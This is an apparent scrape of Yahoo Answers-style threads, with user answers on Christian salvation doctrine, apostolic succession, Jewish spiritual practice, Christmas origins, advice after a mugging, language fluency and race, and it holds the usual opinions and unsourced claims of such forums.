Just,AllGood,etc|`|zMcHYQeBaa	no|`|AA11220299	Not if you genuinely had it.    Jesus said I give unto my sheep eternal life and they shall NEVER perish. So if you received it, you can't lose it.|`|nN3mHJVhaa	Salvation isn't real.|`|USd2LAOUaa	Why hold on to something you never needed in the first place?|`|kD4BBKARaa	"Once you are saved, you are always saved."     God's Word is full of proof for this beautiful truth. And though many deny it, and tell you that you can be lost and saved many, many times, and therefore can never be sure of your salvation, the Bible says otherwise. Talking about His elect sheep, Jesus said: "And I give them eternal life; and they shall never perish, neither shall any man pluck them out of my hand" (John 10:28). See John 6:39, 17:2, 11,12; Romans 8:37-39; II Tim. 1:12; 4:18, etc. etc.     Some object to this doctrine because it supposedly makes men "carnally secure" in their salvation. That is, if I know nothing can make me go to hell once God has saved me, I will "live like the devil." There have been some who have used this beautiful truth as an excuse to live like the devil. But they are not Christians. Nor do they understand this truth. Because this truth also implies "PERSEVERANCE OF THE SAINTS." Those who never fall away are saints. They are holy. And they are given power to live holy lives. They "continue in well-doing." Anyone who says he can "live like the devil" has not experienced the saving power of Christ and does not know the meaning of Philippians 1:6, "He that hath begun a good work in you will perform it until the day of Jesus Christ." God will continue working good works in us until Christ returns.|`|4boTYkt7aa	Yes,you can fall away.Heb. 3:12,Heb. 6:6,John 6:66,1 Cor.4:1-21,1 Cor. 5:9-12,Gal. 2:13,1 Tim. 1:18-20,2 Tim. 2:17-18,James 5:19-20,I hope this helps you.May peace be with you.|`|rz4AUvbaaa	Lot's wife looked back and turned into a pillar of salt.  She didn't lose her Being, but it was hidden from her.  In truth, you can't lose God, but as one rejects truth by ignorance or fear, it will seem like salvation is lost.|`|VsCrYYMeaa	Yes.  Once saved always saved or OSAS is a false non-Biblical doctrine believed by extremist fundamentalists.  And I must add that not all fundamentalists believe in this heretical doctrine.

An hour later a ladder come down from the sky, and they tell the guy grab on, and he again says, No, if god wants to save me he will.

There is a difference between, e.g.    "Dad, why do you always blow your top when I say something?"  and  "Dad, when I say something to you and you get so angry then I get very scared."    You might want to look at the idea of non-violent communication. A starting point could be Marshall B Rosenberg's "Nonviolent Communication" subtitled "A language of Compassion"    As far as prayer goes, maybe the prayer of St. Francis?    Lord, make me an instrument of Thy peace;   where there is hatred, let me sow love;   where there is injury, pardon;   where there is doubt, faith;   where there is despair, hope;   where there is darkness, light;   and where there is sadness, joy.   etc.|`|97oxJ0B8aa	Yeah.

Mary Meets Jesus as He Carries His Cross  5. The Crucifixion and Death of Jesus  6. The Body of Jesus is Taken Down from the Cross and Placed into Mary's Arms  7. Jesus is Placed in the Tomb.    Mary wishes for us to pray one Hail Mary while meditating on each of the Seven Sorrows, for a total of seven Hail Marys. She has made the following promises to those who do this on a daily basis:    1. I will grant peace to their families.   2.They will be enlightened about the Divine mysteries.   3. I will console them in their pains and I will accompany them in their work.   4. I will give them as much as they ask for as long as it does not oppose the adorable will of my Divine Son or the sanctification of their souls.   5. I will defend them in their spiritual battles with the infernal enemy and I will protect them at every instant of their lives.   6. I will visibly help them at the moment of their death, they will see the face of their Mother.   7. I have obtained this Grace from my Divine Son, that those who propagate this devotion to my tears and dolors, will be taken directly from this earthly life to eternal happiness since all their sins will be forgiven and my Son and I will be their eternal consolation and joy.|`|dz5Og81Qaa	Unfortunately it's similar to the case of an alcoholic. They have to realize there is a problem before they can do anything about it. The ego is purified by acts that serve others rather than the self. The individual has to be motivated to serve someone other him or herself and to do it out of love.    The best thing you can do prayer-wise is to pray for the light and love of God to fill his heart and mind. Ask the angels for help. You can also pray for help w/ your reaction to him. The only person you can truly control is you. Ask the angels for help w/ this as well.    It won't be long before you are old enough to move out. If you seriously think this is abuse talk to another adult you trust (but don't be the kid who calls 911 because his mother served hot dogs 3 days in a row).

I notice that the locale changed from underground to above ground, from darker to lighter.  Still, the handicap did not change.    I really can't do much with this.  Do you feel that your brother is treated unfairly in your family and it hurts you that he doesn't seem to see it?  However, the situation seems to be improving, either for yourself or your brother.  Either you are seeing more clearly or he is improving slowly but still can't see what's going on.

So long as nothing is written that contradicts biblical teaching, and you tell the reader that it is just a hypothetical story that possible additional parts of the Bible, I see no reason why not.  Like, writing a book about the life of Adam and Eve after they were cast from the garden of Eden, or perhaps a day to day story of Noah before, during, and after the flood.|`|1VoUuJC1aa	It kinda sounds like you're talking about Passion Plays.  When the service was given entirely in Latin, the boredom was lethal.  Outside the churches, players gave little plays based on bible verses that was easier for people to understand and more entertaining than just listening to a sermon.    But if you're asking about 'continuing stories' of bible characters, settings or stories, it depends on your POV.  Bible based themes crop up in a lot of literature, moves, stand up comic acts...  Some are respectful, others not so much.  I don't think that using the bible to start a story is blasphemous, but an approach to the topic that is doubtful, skeptical, or slash fiction where Judas betrays Jesus with 'a kiss' that involves more then the lips, that could certainly be blasphemous.

WB028eTDaa	Well, the first thing that you need to do, Mia, is call the police. This is the first thing that you need to do, with or without any witnesses that may have seen. Sounds obvious, but some people don't even bother calling the police to say that they've been mugged. If someone mugs you, it's best if you report the crime so that the police can try and find the culprits to stop it happening again to somebody else. If your phone's been nicked and it's insured, you'll definitely need to call the police. You'll want to recollect anything that has been stolen from you, obviously, and calling the police is the most sure way to place your bet at any of that stuff getting returned back into your possession. "The police will give you a crime number, which you have to give to your insurance company so that they can look at your claim."     The next thing you need to do? Give as much info to the police as you can. Although you'll have been through a traumatic experience, it's important that you try and give as full a description as possible so that your thieves can get caught and your good returned back to you. Sometimes the police will ask you if you mind riding around in their car or van with them for a while to see if you can spot who did it. If you can face it, it might be worth doing; you might be able to get your stuff back. Perhaps the most important thing: Cancel everything.  As soon as you can, get on the phone to your bank to make sure that the mugger can't use any of your cards.    If your mobile has been taken, you should also get in touch with your mobile phone service provider and get your SIM card and phone blocked. If your phone wasn't insured and you have a contract phone, you will have to pay for a new SIM card. Replacing your phone without insurance can be costly, unless you buy one secondhand. Your mobile phone company may be able to tell you where you can get hold of one. If your mugger has been using your cards, different banks have their own policies for dealing with this. As long as you reported the crime as soon as possible, it's unlikely you'll be liable for whatever they spend, but check with your bank.|`|aBqJhdufaa	1) Track down the one who mugged you  2)Beat until unconscious  3) Run like hellzzzz|`|VkFWgXaHaa	i was 12 or 11 at the time so i cried and walked sobbing home :(|`|lVGOFmAZaa	report to the police, and tell them when and where it happened. it may not seem like it matters, but trust me, it does.|`|MyV9qm99aa	Seriously: I call police.

vT3D1i5gaa	Apostolic succession is the line of bishops stretching back to the apostles. All over the world, all Catholic bishops are part of a lineage that goes back to the time of the apostles, something that is impossible in Protestant denominations (most of which do not even claim to have bishops).     The role of apostolic succession in preserving true doctrine is illustrated in the Bible. To make sure that the apostles teachings would be passed down after the deaths of the apostles, Paul told Timothy, "[W]hat you have heard from me before many witnesses entrust to faithful men who will be able to teach others also" (2 Tim. 2:2). In this passage he refers to the first three generations of apostolic successionhis own generation, Timothys generation, and the generation Timothy will teach.     The Church Fathers, who were links in that chain of succession, regularly appealed to apostolic succession as a test for whether Catholics or heretics had correct doctrine. This was necessary because heretics simply put their own interpretations, even bizarre ones, on Scripture. Clearly, something other than Scripture had to be used as an ultimate test of doctrine in these cases.|`|h5q89E3Haa	Apostolic Succession:    Acts1:  20 For it is written in the Book of Psalms: 'Let his encampment become desolate, and may no one dwell in it.' And: 'May another take his office.'  21 Therefore, it is necessary that one of the men who accompanied us the whole time the Lord Jesus came and went among us,  22 beginning from the baptism of John until the day on which he was taken up from us, become with us a witness to his resurrection."  23 So they proposed two, Joseph called Barsabbas, who was also known as Justus, and Matthias.  24 Then they prayed, "You, Lord, who know the hearts of all, show which one of these two you have chosen  25 to take the place in this apostolic ministry from which Judas turned away to go to his own place."  26 Then they gave lots to them, and the lot fell upon Matthias, and he was counted with the eleven apostles.|`|AA11440601	Yes.    We believe in one, holy, catholic, and apostolic Church.  -- The Nicene Creed from 325 C.E.    The Catholic Church is apostolic because she is founded on the apostles, in three ways:    ? She was and remains built on the foundation of the Apostles, the witnesses chosen and sent on mission by Christ himself and inspired by the Holy Spirit    ? With the help of the Holy Spirit dwelling in her, the Church keeps and hands on the teaching, the words she has heard from the apostles;    ? She continues to be taught, sanctified, and guided by the apostles until Christ's return, through their successors, the college of bishops, in union with the successor of Simon Peter, the Church's supreme pastor, the Pope.    For more information, see the Catechism of the Catholic Church, sections 857: http://www.usccb.org/catechism/text/pt1s...    With love in Christ.|`|QdAEKbveaa	The Catholic church has been mislead, the apostlic traditions were falseified before the days of Constantine.    The true Church is referred to as the Assembly. This assembly was persecuted by the Roman Catholics, and these people, (Gods true church) was spread all around in the world.    If you follow the teachings of the bible directly, you will realize that the Catholic institution has made many things up and are leading millions astray.    Beware, one example is that the popes move in succession passing the seat of Peter down the line, but how can this be if one pope never lays his hands upon another? Its all a cherade, seek and ye shall find.    Blessings|`|VsCrYYMeaa	Jesus Christ founded the Church on Peter.

425ca8dc150991adaf3ef229478796cdaa	My suggestion is that you begin to daven each morning, even if it's simply saying the Shema. Perhaps also learn some of the bracha, blessings that we say to mark different moments throughout the day, things like hearing good news, or eating different foods. These can help you feel more aware, mindful and connected through the week.|`|nbNhvJZjaa	Hi Mischelle! Benjudah here.The biggest mistake we make is to try to be more of what we feel we're not instead of understanding and trusting who G-d says we are.You have many wonderful role models in  the Torah.But all these had a growing relationship with their husbands   and/or while single with G-d.They danced before him,played music or   used tambourines.Even male greats like King David played and danced before him,and I believe it was also at home or in the field..  Do it  because he's worthy and not that you have to, to be more   Jewish.I made a wrong choice,didn't like the pain but looked back and can say with the prophet Yeremiah 29 verse11.He has our best interest at heart.Yosef suffered ,Moshe I'm sure felt like a failure,and mothers who wanted chili beans were in the pain of barrenness(but for all that sought to please Him)G-d came through.Adoni was very good to all but I always watch what touched G-ds heart.Because if there was no temple I am still Abraham's child,the just shall live by faith.  Abraham believed who G-d said he was and it was counted to him  for spiritual righteousness.That's foundation!Sing and dance and play before him.Trusting his promise of 29,11.The L-rd G-d ,the Holy one of Israel will visit you.The greatest commandment isn't to be m o r e jewish but to love Him more.    Shalom   Benjudah.|`|i0Ydiqj2aa	If this is about dedication, that you want to be more observant, but you feel the people around you don't really care too much about that kind of thing. Then perhaps you're in the wrong circle. Best thing to do is to look for a group of people that have the same kind of dedication.    You should visit a conversative or orthodox Rabbi (or Rabbitzin) and talk to him/her about your feelings and what you're going through.|`|wU0c3i7baa	I would agree with others that it might be a good idea to switch to a Conservative or Modern Orthodox synagogue that you feel comfortable in. Being around others who live and breathe Judaism can strengthen your spirituality and make you feel less doubtful and out of place.     My life changed when I went on a shabbaton in Hebrew school--I became Kosher and intensely interested in Judaism even though my family is extremely secular. You could try finding one that works for you.    Though I haven't been to Israel, I know that people who go there come back feeling more Jewish than ever.    Have fun and enjoy Jewish culture beyond synagogue. Watch a Woody Allen movie or read the Chosen, Everything is Illuminated, Yiddish Policeman's Union, etc.    A defining characteristic of Jewish history has been suffering. I still believe that we are the Chosen people in spite of this. G-d knows we can overcome these trials and tribulations. You're strong and He appreciates it, even if you sometimes don't know it.|`|AA10202389	Paraphrasing Ezekiel, he said the wind came but He wasn't in the wind. The fire came, but He wasn't in the fire, but in the still small voice. We talk to God, but don't listen to our intuition as Ezekiel did. He comes in dreams and inspirations to guide. We were given dominion over the earth. He offers the guidance. He won't make our beds, but he will instruct us how. I suspect the more important rules are love, compassion forgiveness, mercy, and listening. Einstein was spiritual and said that "The only real valuable thing is intuition." If that's how God speaks to us, if that's our connection with God, then Einstein was certainly right, because what can be more important than that connection. If we feel unconnected, then we are. See what I mean. Connected is a different world. Without it what a waste of time. Just scientifically love in the heart creates anti-depressants, pain killers and the like. It's hard to keep in that spirit, but it's surely the right attitude. They are now showing that it connects us to our genius inside. Genius is just that technique, always has been. Wouldn't that be a help? We have to be empty so He can fill, it's not of ourselves. It doesn't belong to earthling man to guide his own steps. It's all rules for us, not to please Him except as a father is pleased when his son is happy. Looking back, I wouldn't change a thing, as I couldn't have gotten here any other way from where I was. Mankind has gotten is such a pickle, we just have to go through there to get over here. There are rules, just like in physics. If you change physics, poof, the world disappears. You can't break the rules, but you can fix the consequences eventually. We so much have to do it together. In that emptiness is the real fulfillment. Everything was made from what we think of as nothing. Nothing is everything and everything is relatively speaking what we call nothing. Even 95% of the universe is made of something like nothing and even more is empty space and anti-matter. Science says and you know they are never wrong. OK, sometimes.   Women have 30% more intuition than men. Feelings are backed by thoughts. Change the thought and then the thoughts, change the feeling. The inner strength is deep inside, not on the surface. All ideas are only maps and facets of an issue and not the territory, but one way to put it is our strength comes out of that void. Everything else seems to be only more of us. It's like an open door to everything else, an infinity of all the other things we missed seeing and feeling. It is all explained scientifically, but explanations are analysis from the outside. We need to go in. Have you heard that saying, "Go within, or go without"? Where is he not? In a way, pretty much, not where we think He is so much. We have to be ready to dance as life is not a goal, but a journey like surfing is not to get to the beach, but it's about the ride. From here it pretty much is let go and let God, but 'see' him and feel him also. We don't know all we can see and do yet. That's perhaps more important than what we've done. I find service, thankfulness, forgiving and things like that work, if you know how to work them and are ready. Sometimes doing them gets us ready. It seems it won't happen any sooner, but if we give up, it may not happen at all for some time. When the student is ready the teacher will appear. Hope that's not too exotic, but for thousands of years things like that have been said for a reason. When you go home it's you and God and that's more real than the entertaining hype.|`|19922ecff123841b68f933197d10192baa	Go visit Israel....?|`|DTog0VZWaa	Talk with your Rabbi.  That's what he/she is there for!  To help you find spirituality.    Are there any events going on at synaguogue such as a Rosh Hodesh group, or study classes on the religion itself?  Services are only such as small part of Judaism.  Much of the strength comes from studying & learning.  The rituals can remind one of the rest of the religion, but aren't the core themselves.    I'm a little puzzled by your hope of God watching you & helping you by saving you from things.  It's not really what I've learned to expect from God in Judaism.   I see Judaisam as giving me guidance & strength but not fixing things for me, that life isn't fair or orderly.  However, I'm just one person & everyone can have their own answers.  You aren't to first to face these questions.     There are so many online resources that can also aid in studying & connecting with others & finding ideas you want to expand on in real life expereinces.  Some sites:  http://www.jewfaq.org  http://www.urj.org  (reform judiasm union)  www.aleph.org ( renewal judaism)  http://outreachjudaism.org    I hope this gives you some ideas to go with.  I'm sure you'll find lots as you start looking.  Knowing the question is 1/2 the battle.  Do reach out to your congregants & Rabbi & see what they have to offer!   I'll star too & see what others think of.|`|TVJsOEKNaa	Perhaps you should look into one of the other branches of Judaism (like Conservative, or Orthodox) and see if you fit in better there.     I think we all go through a period in our lives where we feel stuck and unsure of what to do.  The best advice I can give here, is to learn as much as you can, and to involve yourself in different group activities.     Perhaps you can participate in local Shabbatons in your area, join a woman's study group, and talk with your Rabbi more about these issues.  However, if you are not comfortable at your shul, you should definitely check around.     The fact of the matter is that we all have trials and tribulations in life that we go through. Most people have skeletons in their closets, and have to find ways to cope with such things.     God isn't supposed to save you: I don't know where you got this concept, but the idea is that you need to work on things yourself, through both the good and bad times.  When you have exhausted every outlet, God comes in and helps. =)    I have been struggling with the same thoughts, and I wholeheartedly belief that a positive mindset and attitude can really issues that you have.

You're too young for him to make you think about marriage and children. Tell him to wait till you are a certain age. I don't see problems of having children. I mean if you want a black baby they will face issues as they grow up as well.|`|9XA7KxK5aa	I think it is nice of him to look at a relationship in this serious manner, but on the other hand, you are really too young to get married.      If you really love him and are serious about your future with him but just thnk it is too early for you to get married, you should discuss with him and tell him how you think, including your idea about biracial children.  Maybe you two can come up some good ideas after the discussion.|`|ubhT7rJvaa	girlie i think you are too young to be thinking about kids and marriage anyways, so it should be relatively easy for you to address the issue on that merit alone. Him being 27, he's at a different point in his life. he has for sure had more experiences then u have had, he should understand. As far as the half white kid thing, my view is that all children grow up having been teased about something!! that is the gods honest truth! back in the day there were less biracial families, nowadays they are everywhere and as a result i believe society has become waaaay more accepting! Your biggest concerns right now should be about what goals you want to set for your future, what direction do u see your life headed in, do you truly love this man, does he love you. Think about those things! In due time girlie the rest will come, if he's willing to be patient. You're still very young!!  take care!

ridu0Rtwaa	Oh dear another misguided christian totally ignorant about christmas!!    It is nothing to do with either Christianity or Islam but it does have it's origins in the midwinter festival and many other basically pagan rites but since much of it is a celebration of nature rather than religion everyone should be able to enjoy it and be happy together despite religion!!    The ancient European pagans celebrated the midwinter festival and a number of other festivals long before Christianity ever existed!    Babylonians celebrated the feast of the Son of Isis with gluttonous eating and drinking, and gift giving and the goddess of fertility, love, and war.     The Romans held a festival on 25 December called Dies Natalis Solis Invicti, celebrating their own god Sol Invictas - PAGAN.    The Persian god Mithras, the Syrian sun god Elah Gabal, the German Sol, the Greek Helios and the Mesopotamian Shamash.  But also Saturnalia, honouring Saturn, the God of Agriculture. The law courts and schools were closed. No public business could be transacted an this is where the holidays originated - ALL PAGAN!!!    Wax tapers were given by the more humble to their superiors. The origin of the Christmas candle - PAGAN!!    In Rome groups of costumed went from house to house entertaining their people. And this was where the carolling Christmas tradition originated PAGAN!!    Statues of the Mother and lover or Mother and son were paraded through the streets not only in Italy but also in Africa, Spain, Portugal, France, Germany and Bulgaria. Thus, the symbolism of the Heavenly Virgin and the infant child paraded on a yearly basis are not of Christian origin. They stem from the Mother-goddess religion, which is very ancient ENTIRELY PAGAN!!.    Scandinavian countries celebrated Yule honouring Thor - PAGAN.      In Germania (not Germany) they celebrated midwinter night followed by 12 wild nights of eating and drinking.  The 12 days of Christmas PAGAN!!    The church under Pope Julius I declared that Christs birth would be celebrated on December 25 in 350 AD in order to try to hijack the PAGAN festivals but it was largely ignored.  Christians did not really celebrate Christmas until 378 but it was then dropped in 381 and not resurrected until 400.    The Christmas tree stems from pagan tradition and ritual surrounding the Winter Solstice, which included the use of holly boughs ivy  and other foliage as an adaptation of pagan tree worship.  Holly and ivy represented male and female.  Mistletoe was considered a sacred plant, and the custom of kissing under the mistletoe began as a fertility ritual - all PAGAN!!    Santa Claus came from the Dutch Sinterklaas and was a tall figure riding a white horse through the air and usually accompanied by Black Peter, an elf who punished disobedient children.  Also the origin of the reindeer, sleigh and the elves ALL PAGAN!!    The modern red coated Santa was brought about by coca cola!!    America actually banned Christmas several times and is the originator of the expression  Happy Holidays which came about because of the pagan origins of Christmas to include all religions and traditions!!    The Venerable Bede, an early Christian writer pointed out that the Christian church absorbed Pagan practices when it found the population unwilling to give up the festivals. Thus a lot of what Christians now see as Christians practices are in fact pagan!!!    Christmas is the time of year christians strive to prove just how pagan they have become!!!    Atheists do not want to revoke christiams they want you to stop trying to steal it!!|`|HIskrREJaa	i'm an atheist and i love christmas.|`|MbCFe1odaa	Study history....we were never the land of the free|`|69750f25faea5e6021c54c23d0dcb774aa	Why are you lying for Jesus?

TwfyliKiaa	God does not ask for religion. He wants a relationship with you.You believe in Jesus; lived, died and rose again you are good to go. That don't mean you are done there, you should grow and mature in your faith.|`|XEBpv9gwaa	Attending a church has nothing to do with salvation.  However, God intended for us to be in community with people who are of the same mission.  He did not intend for us to live out our faith in isolation.  Sounds like you haven't found the right group yet.  It is possible if you don't give up.  As long as you understand that all humans will always be sinners, Christian or not.|`|wzqahEqiaa	I understand your feelings about organized religion.  You can believe in God and be a Christian without formally being part of a church.    Some of the things I've seen in church irritate me but I try to remember the Saints.  When you become discouraged think about the Saints.  There is a wonderful TV series called Super Saints on EWTN.|`|31e0283ff8bc957ec9168709f61d5bf0aa	It could be okay to believe in God alone without religion but to believe in Jesus is necessary that you belong to religion named after him.  Never blame the religion for the wrong doings of the religious. Man is innately  an insecure being that leads him to  do what is not right and religion to its real purpose is there to help keep one away from sinning. Unfortunately, many who are tempted often are found among its teachers. By being there  and standing for what the religion is called for may help the erring people turn their ways to what is right and good. Running away so as not to be identified as one of them is like allowing all the time for evil to triumph. Is not helping others one of the mottoes of a religion?|`|eO2rnf7yaa	Be careful about judging yourself as so much better than others.  I'm Roman Catholic.

Of course its alright to not want to be apart of any of the popular religions due to the amount of violence, greed, and pedophelia involved with them. Why would God want you to subject yourself to that?    If you have a belief, you have a religion.      Totally just sound theisty just now. Wow|`|OuvATYw3aa	Are you talking about religion or hypocrisy?    As long as you live your life acording to the Word of God, then I say that religion don't matter.

Many people hate religion and for good reason - most organized religions are for-profit tax-free businesses that more involved in entertainment to keep the revenue stream peaked than in the true interest of the spirituality of the members.    Second, the sinful acts that you listed are not even grounds for tremoval froom their congregations, no mattert tha absoluteldanger it presents to the other members . . . they can not lose revenue by casting out dangereous people.    Hating these organization is  NOT A BAD THING, do not pray for a change . . . you are right!    You need to find the right place to worship where the revenue is of no concern but the spiritual welfare of the members and the safety of the congregation is paramount . . . all second on to teaching that is 100% scriptural truth. Look for a Kingdom Hall, make a visit - you will see the difference!|`|0a35bd8efe64caf91fcf1e0cf5d79e07aa	I sure hope so! Jesus was not a great fan of religious people in His days on earth. Re: Pharisees and Sadducees. God bless.|`|18f23c8e100103ef2ddb3c61fe1e09e3aa	Are you kidding me?!?!    I just love how everyone knows all of these BLATANT Christian hypocrits but me.  Look, get over yourself.  We ALL sin!  So, part of your problem is this totally incorrect perception that if you can catch a Christian doing something that he isn't supposed to be doing that you're somehow better than him.  Sigh.  That in and of itself is a sin.  You're being self righteous!    Besides ... let me ask you this.  WHO are you planning to spend eternity with ... beside God and Jesus of course?  Guess what?  It's the very people who make up the churches that you say you can't stand!  If you cannot even be in the room with them then how are you going to spend eternity with them?    Here's the deal.  I have no doubt that every religion is not created equal and certainly every church is not created equal.  The Bible took the time to document good churches and bad ones just so you would know that!  Find yourself a church that isn't filled with ... with ... as I wrote earlier ... BLATANT Christian hypocrits.  I'm a member of a PCA church (Presbyterian Church of America).  It's VERY conservative and I promise you, whatever sins our church members commit are more subtle than you're suggesting.  Maybe you're in one of these liberal God's-word-doesn't-really-matter churches?    Besides ... smoking is not forbidden in the Bible.  Yes, our bodies ARE temples and doing anything to knowingly and intentionally harm our bodies is sinful, but an occassional cigarette?  No addiction to nicotine.  Are you SURE that's a sin?  And drinking alcohol.  Hmmm.  MANY Christian religions teach that the consumption of alcohol is in the realm of freewill.  I know certain religions like say a southern Baptist believes that alcohol is the devil's brew, but scripture aboslutely suggests that Jesus consumed the very same drink that made others drunk in larger quantities.  So, again, it's not so much about the item as it is the amount.      Tell me ... how do you feel about fat Christians?  Is that a sin?  How about those who don't exercise?  I could go on.    I worry that you are absolutely being self righteous and lying to yourself about the real reasons you don't like "religious people."  I would strongly suggest you look for a church that you can stand.  I would also strongly suggest you read the book, The Purpose Driven Life.  And of course ... read your Bible and pray unceasingly about your attitudes toward your brothers and sisters in Christ.  Again, you're all bound for the same place.  If you're going to wind up there then you may as well get used to each other now.    Lord bless, brother!    P.S., Here's a link to search PCA churches by city and state.  I trust that if no other church will do for you that these fine people will show you what it means to be Christians committed to the word of God:    https://processor.pcanet.org/ac/director...|`|3KD6RRhPaa	Actually to be frank with you, God has nothing to do with religion, for its man made.    To become a true disciple of Jesus you must do what this Jesus says you must do. Religion says something else.    If you wish to enter the kingdom of God then you must become truly born again by the water (not your baptism) and the Spirit (John 3:3-5).    And then join the true church of God where you will find the saints gathered together. This church you cannot just find anywhere..believe me.|`|46WBZVaoaa	the guy who had the first answer to your question, u know the one that called you a "hypocrytical moron"?

You are also letting others ge in the way of your religious growth.    The Bible says that when you see your brother sinning you should help him.  Not Judge him.  Not leave.  Help.    That is your second problem.  You are judging other Christians rather than analyzing your own life.    The church is meant to be a support system.  When you fall your brothers can help you up.  When you are discouraged your sisters can encourage you.  You can't live the Christian life without support.|`|7mhRDbvsaa	sure    god didn't create religion|`|9mLjDa5kaa	I'm a saved believer in Jesus that hates religion, not because people do sinful things (we're ALL sinners and I'm not better than anyone), but I hate religion because the Bible exposes religion as false.

l2qtG4yfaa	Fluent does not mean perfect. It is possible to be 100% fluent in a language, but that doesn't mean you know the entire language. Fluency is not based like that, it is based on knowing how to converse, and get your message across with ease. Also, listening and comprehending both verbal and nonverbal messages.|`|933XLRGCaa	For starters, we don't take English class to learn English necessarily.  It is generally for the improvement of our reading and writing skills; it also serves to promote critical thinking.  That is, you don't do the same things in English class that you'd do in Spanish class.    That being said, I still think you raise an interesting point.  After all, there is no one who doesn't make errors in grammar, spelling, pronunciation, etc.  So in that sense, no one is really fluent in a language.      However, for the sake of practicality, it is probably best to define fluency as the ability to understand a different language, and to be understood by speakers of that language.  So in that sense, yes, most everyone is fluent in some language.|`|8Eh1XG1vaa	I speak English fluently but there are obviously scientific terms/medical terms etc. that I don't know. Fluency is being able to express how you feel/what you want/and so on without any hiccups,not just knowing every single word and grammar pattern in the language.A lot of people who are born in America have terrible Grammar...yet they speak English fluently.  No one ever stops learning a language though.Because Language's are always changing and growing.New slang and terminology is being added constantly,so no one is really 100% fluent even if it's their native language.

How come blacks have BET but whites can't have WET?  2. Why does Obama consider himself black?  3. What race do you think I am?  4. Why do black people....  5.

N63LMH5Qaa	if they didn't eat the forbidden fruit then all of us would be in heaven enjoying our times with no science|`|zXJWV7eCaa	Yes!  But just like Adam and Eve, we would not notice anything different.  Remember, it was after they sinned that they became aware of their nudity, hence the leaves!      So, if it had been, you would not take the blind bit of notice, because it would be normal.|`|qEIURrnJaa	If they never ate it then we would not have knowledge of what is good and evil. As for nudity , I dont think so. Im sure God would not have approved of that.|`|N8wutNoLaa	hah.    something tells me if eve did not eat the forbidden fruit, one of her descendants would have.|`|0a35bd8efe64caf91fcf1e0cf5d79e07aa	Yes, but there would be no recognition of the fact.|`|QVFjO5m0aa	Im a nudist anyway.|`|QM0Ezfvnaa	BEING a nudist is a chosen lifestyle, a lifestyle in opposition to being mainstream (clothed), today.    Adam & Eve were mainstream for their time where clothing was simply not used. They were not choosing an alternative lifestyle . . . they were just naked, but not nudists!|`|db7df25ea31227e5641d5c32d43c3bcdaa	no because some one would have sinned and we would still be in the same position|`|8P6MmLv0aa	Now there's a thought, but then walking through the wood naked is nice. been there done that. its gooooooooood|`|d0JqmXjKaa	Yes.|`|pLlnLrhTaa	No we would not be nudists because we would not be ashamed of our nakedness. When Adam and Eve ate the fruit from the Tree of the Knowledge of Good and Evil, they knew sin and covered themselves to hide their nakedness (Gen 3:7).  If there was no sin, you would not know that you were nude (Gen 3:11).|`|aIbcPSYiaa	The bible does not say so an opinion would only be speculative.    Looking at Gen 3:7 which says: "Then the eyes of both of them became opened and they began to realize that they were naked. Hence they sewed fig leaves together and made loin coverings for themselves." and at Gen 3:21 we find: "And Jehovah God proceeded to make long garments of skin for Adam and for his wife and to clothe them."    All we can draw from this is that both Adam and Eve felt shame looking at each other after sinning. And then God was kind enough to respect their need for dignity and protection by providing better covering for them than the fig leaves they put together.
TOBYij3Qaa	Im not sure but I will try to find out :D    July 7, 1938  June 15, 2000 was a Reformed theologian and pastor of Tenth Presbyterian Church in Philadelphia from 1968 until his death.
gAzb5PAbaa	I think America has the largest number of Christians (90%) , and I think Sweden's population is like 85% atheist.|`|Iva8drdfaa	Darth, in America it is 75% Christian.    And even that is an overstatement, as a majority of Christians in the US, only use the title.|`|AA10530949	Well, as Vatican City is considered it's own country, I would go with that.  That's the headquarters of the Roman Catholic Church, by the way, so 100% of its residents are Catholic!  But, it's only 1 square mile in area, so I expect you don't count that!  The U.S. is probably one of the more religious of the industrial countries... something like 85% of Americans believe in God.  Europe is becoming much more secular/atheist, but Spain and Italy have retained a lot of their Catholic identity as well.  Interesting question, I'm sorry I don't have a statistical answer!|`|dFBccLExaa	Well, most of Asia is packed full of Hindus and Buddhists... does that count?|`|cAaAwXQvaa	most religious country is definitely India, about 900 million hindus,  and the most Athiests is Russia, almost 90 per cent of the population.|`|mSFjbetxaa	The USA probably just because we are such a large country.

Lona your questions are great!|`|XEbrGfZuaa	We used to know a couple like that. She always wore the pants  alright. And he wore an invisable ball and chain. He admired her for  her independance and impulsive personality to just get up and go and  do something. Right then and there. He was more subdued and on  the quiet side. She did all of the talking. She would chain smoke and  talk a mile a minute. He would sit quietly and sip a beer. Often, looking into the bottom of his glass.      He became an alcoholic, spending time at the bar paying for  close ups to bottomless dancers, I'm told. Then he met someone and  had a long affair. One day it all came to a head and the wife ran into  the girl friend on their houseboat getaway. It was a cat fight, to end all  cat fights. Hubby pleaded, and won his place back again, after   agreeing to dry out with a doctors' help. And the wife eased up on the  controlling personality. And they started over again. It took a shock to  their marriage, to wake themselves up and out of a rut going down-  hill.     Often when a man gets much older in his marriage,he decides when  enough is enough, and he decides to take back the reins. And he  wants to start being the controlling party. As long as they don't verb-ally abuse one another, and they can come to terms with the fact  they want to stay together, they usually can come to a happy   medium. But it's communication, that a couple has to keep within  their marriage. For when it is missing, everything becomes unglued.  And the happiness starts to allude them. I have found, that and love and respect, are the necessary ingredients that hold a marriage together. And they usually become their very best friends.|`|Dmaahsc3aa	A ring through his nose. . . . poor guy .|`|386524142680a3e18e5b2498e17e6041aa	A look of disgrace!|`|S2FhDtfSaa	Motorcycle helmet|`|kYYHw7xEaa	A nice floral skirt, substitute for a kilt.

FiPzE9nwaa	They call themselves white because they probably ARE.  Hispanic just means they are from a Spanish speaking country so they can be any race. People from Spain are white as are most Argentinians. Americans can be any race , and hispanics can too.  spain    http://www.antena3.com/PortalA3com/image...  http://archivo.eluniverso.com/2007/05/05...  http://www.reportajes.org/wp-content/upl...|`|qMhLcn8Gaa	You normally treat people differently if they really ARE hispanic?    ...wow.|`|ZZMwNanqaa	Hispanic is not a race.

